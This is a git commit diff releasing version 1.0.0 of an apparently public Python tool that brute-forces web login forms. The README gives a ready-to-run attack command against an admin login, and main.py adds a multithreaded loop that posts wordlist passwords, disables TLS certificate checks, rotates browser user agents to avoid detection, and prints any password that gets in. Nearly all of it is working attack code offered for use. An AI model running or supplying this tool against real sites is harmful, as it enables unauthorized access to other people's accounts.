e0b6e209b125fcbdafca2fcbf7a72c8c032ac808
apel <55012507+53buahapel@users.noreply.github.com>
2024-02-08 23:02:03 +0700

    v1.0.0
    release

--- README.md
+++ README.md
@@ -4,4 +4,26 @@
 
 This is a simple tool to bruteforce login pages. It is written in Python and uses the requests library to send HTTP requests.
 
-## Usage
+## Simple Usage
+
+```ps
+python3 main.py --url URL --data DATA --wordlist WORDLIST --expected EXPECTED
+
+# example
+
+python3 main.py --url http://example.com/login --data "username=admin&password=*" --wordlist wordlist.txt --expected "Invalid username or password"
+```
+
+## Options
+
+- `--url` - The URL of the login page
+- `--data` - The POST data to send to the login page. You can use the `*` character to replace with the wordlist value
+- `--ctype` - The content type of the POST data. Choose 0 for `x-www-form-urlencoded` and 1 for `JSON`
+- `--wordlist` - The location of the wordlist file
+- `--expected` - The expected response when the login fails
+- `--threads` - The number of threads to use
+- `--random-agent` - Use a random user agent
+
+## Contributing
+
+Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.
--- main.py
+++ main.py
@@ -1,8 +1,22 @@
-import ssl
 import random
+import requests
+# import datetime
+from datetime import datetime
 from argparse import ArgumentParser, Namespace
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import sys
 
 __version__ = 'v1.0.0' # <major> <minor> <path>
+__userAgent__ = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
+                    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.',
+                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/122.0']
+
+__contentType__= [  'application/x-www-form-urlencoded',
+                    'application/json',
+                    'multipart/form-data']
 
 class Color:
 
@@ -17,10 +31,10 @@ class Color:
     RESET   = '\033[39m'
 
     def red(text):
-        print(f'{Color.RED}{text}{Color.RESET}')
+        print(f'[+] {Color.RED}{text}{Color.RESET}')
 
     def green(text):
-        print(f'{Color.GREEN}{text}{Color.RESET}')
+        print(f'[+] {Color.GREEN}{text}{Color.RESET}')
 
     def yellow(text):
         print(f'[+] {Color.YELLOW}{text}{Color.RESET}')
@@ -69,17 +83,6 @@ def banner():
     Color.cyan(text)
 
 class FastLoginBruteforcer:
-    
-    __userAgent__ = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.3',
-                     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.',
-                     'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.3',
-                     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.',
-                     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
-                     'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/122.0']
-    context = ssl.create_default_context()
-    context.check_hostname = False
-    context.verify_mode = ssl.CERT_NONE
-
 
     def __init__(self, args: Namespace):
         self.url            = args.url
@@ -87,6 +90,7 @@ class FastLoginBruteforcer:
         self.wordlist       = args.wordlist
         self.threads        = args.threads
         self.random_agent   = args.random_agent
+        self.expected       = args.expected
         self.wl             = self.load_wordlist()
         self.wlcount        = len(self.wl)
 
@@ -104,27 +108,74 @@ class FastLoginBruteforcer:
         Color.yellow(f'Threads          : {self.threads}')
         Color.yellow(f'Random Agent     : {self.random_agent}')
 
-    def login(self):
-        global __userAgent__
+    def run(self):
         self.initial_info()
 
-        url      = self.url
-        data     = self.data
-        wordlist = self.wl
 
-        if self.random_agent:
-            headers = {
-                'User-Agent': random.choice(__userAgent__)
-            }
-        else:
-            headers = {
-                'User-Agent': __userAgent__[0]
-            }
+        url             = self.url
+        data            = self.data
+        expected        = self.expected
+        random_agent    = self.random_agent
+        threads         = self.threads  
+        wordlist        = self.wl
+        wlcount         = int(self.wlcount)
+
+        try:   
+            success_login = False
+
+            Color.yellow("Starting Brute Force ...")
+            with ThreadPoolExecutor(max_workers=threads) as executor:
+                processed = (executor.submit(login, url, data, pwd.decode(), expected, random_agent) for pwd in wordlist)
+                for i, process in enumerate(as_completed(processed)):
+
+                    if wlcount > 1:
+                        print("[{}][INFO] trying at {} attempt.".format(datetime.now().strftime("%H:%M:%S"), i), end="\r")
+
+                    process = process.result()
+                    if process is not False:
+                        success_login = True
+                        break
+                    
+                if success_login is True:
+                    Color.green(f"Clearing all process ...                                               ")
+                    sys.exit(0)
+                else:
+                    Color.red("cannot enter into the target dashboard")
+                    sys.exit(0)
+            
+        except Exception as error:
+            Color.cyan(error)
+            sys.exit(0)
+
+def login(url, data, password, expected, random_agent):
+    global __userAgent__
+    headers  = {"Content-Type" : "application/x-www-form-urlencoded"}
+
+    if random_agent:
+        headers['User-Agent'] = random.choice(__userAgent__)
+    else:
+        headers['User-Agent'] = __userAgent__[0]
+    data = data.replace('*', password)
+
+    try:
+        req = requests.post(url, data=data, headers=headers, verify=False)
+        req = req.text
+        if expected not in req:
+            print('Login Success with password is ', end='')
+            Color.cyan(f'{password}')
+            return True
+        return False
+    except Exception as e:
+        Color.red(f'Error: {e}')
+        return False
+        
+        
 
 if __name__ == '__main__':
     parser = ArgumentParser(description=banner())
     parser.add_argument('--url',          metavar='URL',       required= True, type=str, help='target url (http://example.com)')
     parser.add_argument('--data',         metavar='DATA',      required= True, type=str, help='post data ("username=admin&password=*") you can add "*" sign to replace with wordlist value')
+    parser.add_argument('--ctype',        metavar='CTYPE',     required= False,type=int, help='content type CHOOSE -->      \n0. x-www-form-urlencoded\n1. JSON', default = 0)
     parser.add_argument('--wordlist',     metavar='WORDLIST',  required= True, type=str, help='wordlist location path (wordlist.txt)')
     parser.add_argument('--expected',     metavar='EXPECTED',  required= True, type=str, help='expected response when login failed ("WRONG")')
     parser.add_argument('--threads',      metavar='THREAD',    required= False,type=int, help='number of threads (default: 1)', default = 1)
@@ -133,5 +184,5 @@ if __name__ == '__main__':
 
     args    = parser.parse_args()
     run     = FastLoginBruteforcer(args)
-
-    run.login()
+    
+    run.run()
